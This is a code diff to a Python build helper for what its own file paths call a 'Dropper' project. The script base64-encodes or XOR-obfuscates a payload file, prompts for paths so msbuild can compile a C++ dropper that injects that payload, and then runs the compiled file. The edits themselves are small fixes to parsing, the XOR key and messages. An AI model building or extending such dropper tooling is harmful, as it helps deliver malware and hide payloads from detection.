@@ -62,6 +62,7 @@ def read_file_information_from_script_info(script_info):
 		for line in fr:
 			print(line)
 			line = line.strip("\n")
+			line = line.strip("\t")
 			if (line[0:16] == "file_exe_path = "):
 				file_information["file_exe_path"] = line[16:]
 				print("file_exe_path is: " + line[16:])
@@ -98,6 +99,10 @@ def base64_file(payload_file, encode, decode):
 
 
 def xor_file(payload_file, xor_key):
+	if (xor_key > 255):
+		print("This script only lets xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
+		xor_key = 255
+
 	with open(payload_file, "r") as file_read: 
 		payload = file_read.read()
 		file_read.close()
@@ -109,16 +114,17 @@ def xor_file(payload_file, xor_key):
 	return payload_file
 
 def run_program(run_file):
-	subprocess.run([run_file])
+	result = subprocess.run([run_file])
+	print(f"The return code of the run file was {result.returncode}")
 
-def main():
+def main():	
 	
 	flag_arr = parse_args()
 	script_info_location = r"C:\Users\adind\Dropper\Walmart-version-of-Dropper\script_info.txt"
 
 	if (flag_arr[6] != True):
-		file_path = input("Give the file path to the program you want to pass in to msbuild so that msbuild can compile it (should end in .vcxproj) : ")
-		payload_path = input("Set the default file path to the payload that the dropper will inject (no file extension should be applied): ")
+		file_path = input("Give the file path to the file you want to pass in to msbuild so that msbuild can compile it (should end in .vcxproj) : ")
+		file_payload_path = input("Set the default file path to the payload that the dropper will inject  (In the c++ file this will need to be copied without the file extension.In the .rc file this will need to be copied exactly.) : ")
 		file_exe_path = input("Give the file path to the place where the exe will place after msbuild compiles it (should have an exe file extension): ")
 
 	else:
@@ -126,7 +132,7 @@ def main():
 		file_path = script_dict.get("file_path")
 		file_payload_path = script_dict.get("file_payload_path")
 		file_exe_path = script_dict.get("file_exe_path")
-	
+
 	if (file_exe_path == "" or file_payload_path == "" or file_path == ""):
 		print("Hardcode flag set but one or more of the variables was blank.")
 	else:
